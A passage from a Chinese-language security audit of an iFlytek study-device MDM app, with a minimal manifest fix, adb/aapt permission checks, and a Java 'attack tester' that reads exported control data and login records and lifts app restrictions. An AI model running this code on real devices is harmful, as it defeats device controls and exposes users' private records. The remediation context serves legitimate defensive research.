### 6.3 快速修复清单（最小改动）

如果时间紧迫，仅做以下 3 个修改即可阻断所有普通用户模式攻击：

```diff
<!-- AndroidManifest.xml 最小修复 -->
<provider
    android:name="...ControlDataContentProvider"
    android:exported="true"
+   android:permission="com.iflytek.ebg.aistudy.mdm.permission.MDM_CONTROL_DATA"
/>

<service
    android:name="...DumpService"
-   android:exported="true"
+   android:exported="false"
/>

<service
    android:name="...UniversalTransferService"
-   android:exported="true"
+   android:exported="false"
/>
```

**3 行代码改动 = 阻断所有普通用户模式攻击。**

---

## 附录 A：攻击测试代码模板

```java
// MDMAttackTester.java - 完整攻击测试
package com.example.mdmtest;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

public class MDMAttackTester {
    private static final String TAG = "MDMAttackTester";
    private static final String CONTROL_URI = "content://com.iflytek.ebg.aistudy.mdm_sdk.control/control_data/1/";
    private static final String STAT_URI = "content://com.iflytek.ebg.aistudy.mdm_sdk.stat/statistical_data/";
    private static final String COMMON_URI = "content://com.iflytek.ebg.aistudy.mdm_sdk.common/common_data/";

    /**
     * 测试1: 读取管控配置
     */
    public void testReadControlConfig(Context context) {
        ContentResolver cr = context.getContentResolver();
        try {
            Cursor cursor = cr.query(Uri.parse(CONTROL_URI), null, null, null, null);
            if (cursor != null) {
                Log.i(TAG, "=== Control Config ===");
                while (cursor.moveToNext()) {
                    Log.i(TAG, "Package: " + cursor.getString(0));
                    Log.i(TAG, "Config: " + cursor.getString(1));
                }
                cursor.close();
            }
        } catch (SecurityException e) {
            Log.w(TAG, "Read control config blocked: " + e.getMessage());
        }
    }

    /**
     * 测试2: 解除单个应用管控
     */
    public void testBypassControl(Context context, String targetPackage) {
        ContentResolver cr = context.getContentResolver();
        Uri uri = Uri.parse(CONTROL_URI + targetPackage);
        ContentValues cv = new ContentValues();
        cv.put("apps_control_data", "{\"disabled\":false,\"duration_limit\":99999}");
        try {
            int rows = cr.update(uri, cv, null, null);
            Log.i(TAG, "Bypass result for " + targetPackage + ": " + rows + " rows updated");
        } catch (SecurityException e) {
            Log.w(TAG, "Bypass blocked: " + e.getMessage());
        }
    }

    /**
     * 测试3: 读取使用统计
     */
    public void testReadStats(Context context) {
        ContentResolver cr = context.getContentResolver();
        String[] types = {"1", "2", "3"}; // appUse, deviceUse, deviceConfig
        try {
            for (String type : types) {
                Cursor cursor = cr.query(Uri.parse(STAT_URI + type), null, null, null, null);
                if (cursor != null && cursor.moveToFirst()) {
                    Log.i(TAG, "Stat type " + type + ": " + cursor.getString(0));
                    cursor.close();
                }
            }
        } catch (SecurityException e) {
            Log.w(TAG, "Read stats blocked: " + e.getMessage());
        }
    }

    /**
     * 测试4: 读取登录记录
     */
    public void testReadLoginRecords(Context context) {
        ContentResolver cr = context.getContentResolver();
        try {
            Cursor cursor = cr.query(Uri.parse(COMMON_URI + "3"), null, null, null, null);
            if (cursor != null) {
                Log.i(TAG, "=== Login Records ===");
                while (cursor.moveToNext()) {
                    Log.i(TAG, "Record: " + cursor.getString(0));
                }
                cursor.close();
            }
        } catch (SecurityException e) {
            Log.w(TAG, "Read login records blocked: " + e.getMessage());
        }
    }
}
```

**验证防御是否生效：** 在修复后运行上述测试代码，所有方法都应抛出 `SecurityException`。

---

## 附录 B：权限检查工具

```bash
# 检查APK的exported组件
aapt dump badging mdm.apk | grep -E "exported=true|permission"

# 检查Provider权限
adb shell dumpsys package com.iflytek.ebg.aistudy.mdm | grep -A5 "Provider"

# 检查Service权限
adb shell dumpsys package com.iflytek.ebg.aistudy.mdm | grep -A5 "Service"

# 检查自定义权限定义
adb shell dumpsys package com.iflytek.ebg.aistudy.mdm | grep "permission"
```

---

*本文档基于静态代码分析编写，所有攻击代码均基于反编译源码的逻辑推断。*
*仅供安全研究和防御改进使用。*
